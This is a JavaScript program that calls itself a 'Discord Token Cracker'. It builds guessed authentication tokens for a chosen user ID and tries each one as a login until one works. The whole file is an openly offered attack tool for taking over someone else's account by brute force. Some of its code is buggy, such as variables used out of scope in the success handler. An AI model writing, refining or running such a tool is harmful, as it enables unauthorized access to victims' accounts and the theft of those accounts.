const chalk = require("chalk");
const Discord = require("discord.js");
const fs = require("fs");
const client = new Discord.Client();
const { base64encode } = require("nodejs-base64");
let { user_id, delay } = require("./config.json");

let attempts = 0;

// validate the user id
if (isNaN(user_id)) return console.warn(chalk.red(`Error: "${user_id}" is not a valid number`));
if (user_id.toString().length != 18) return console.warn(chalk.red("Error: The provided user ID too short"));
if (Math.ceil(user_id) != user_id) return console.warn(chalk.red("Error: The user id cannot contain a decimal"));
if (Math.abs(user_id) != user_id) return console.warn(chalk.red("Error: The user id cannot be a negative"));

// user tokens usually start with the user id base64 encoded
function getFirstPart() {
	return (base64encode(user_id) + ".");
}

// get the middle part of the token
function getMiddlePart() {
	let char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-_";
	let result = "";
	for (let i = 0; i < 6; i++) {
		result += char.charAt(Math.floor(Math.random() * char.length));
	}
	return (result = result += ".");
}

// and the hard part, the 3rd part
// we need to generate a 27 long string
function getLastPart() {
	let char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_";
	let result = "";
	for (let i = 0; i < 27; i++) {
		result += char.charAt(Math.floor(Math.random() * char.length));
	}
	return result;
}

// now we check if the token we generated is valid
function validateToken() {
	let token = getFirstPart().concat(getMiddlePart(), getLastPart());
	let currentDate = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

	attempts++
	process.title = `Discord Token Cracker - By MrDiamond64 | Total Attempts: ${attempts}`;

	// make sure the token isnt in our database
	const invalidtokens = JSON.parse(
		fs.readFileSync("./invalidtokens.json"),
	);

	if (invalidtokens[token.toString()]) return console.log(chalk.gray(`${currentDate} | Token "${token}" is in our invalid tokens database, skipping`))

	client.login(token).catch(error => {
		if (error.toString().startsWith("Error: Incorrect login details were provided.")) {
			console.log(chalk.blueBright(`${currentDate} | Invalid Token: ${token}`));

			// add the invalid token to our database
			invalidtokens[token.toString()] = {
				isInvalid: true
			}
			fs.writeFileSync('./invalidtokens.json', JSON.stringify(invalidtokens));
		} else console.warn(currentDate + " | " + error);
	});
}

client.once("ready", () => {
	console.log(chalk.greenBright(`${currentDate} | Found Working Token! ${token}`))
	delay = 2147483646
});

validateToken();
setInterval(() => {
	validateToken();
}, delay);